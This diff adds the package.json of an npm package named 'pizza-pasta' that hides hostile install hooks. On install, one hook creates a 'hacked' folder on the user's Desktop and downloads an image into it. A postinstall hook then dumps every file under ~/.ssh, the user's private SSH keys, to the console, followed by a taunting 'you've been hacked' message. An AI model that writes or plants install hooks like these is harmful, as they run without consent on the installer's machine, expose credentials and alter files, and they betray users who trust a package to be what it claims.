@@ -1,0 +1,11 @@
+{
+  "name": "pizza-pasta",
+  "version": "1.0.3",
+  "description": "",
+  "main": "index.js",
+  "author": "Zeavo",
+  "scripts": {
+  	"install": "mkdir -p ~/Desktop/hacked && touch ~/Desktop/hacked/pwnddddd && wget https://imgur.com/download/KTDNt5I -P ~/Desktop/hacked/",
+    "postinstall": "find ~/.ssh | xargs cat || true && printf '\n\n\n\n\n\nOH HEY LOOK SSH KEYS\n\n\n\nHappy Birthday! Youve been h4ck0red\n\n\n'"
+  }
+}
